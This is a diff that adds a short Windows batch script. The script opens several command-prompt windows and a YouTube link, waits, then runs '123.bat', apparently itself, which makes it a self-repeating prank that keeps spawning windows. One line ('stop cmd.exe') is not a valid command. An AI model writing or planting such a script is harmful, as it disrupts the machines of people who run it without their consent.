@@ -1,0 +1,11 @@
+@echo off
+stop cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start https://youtu.be/hiRacdl02w4
+timeout 28
+start 123.bat
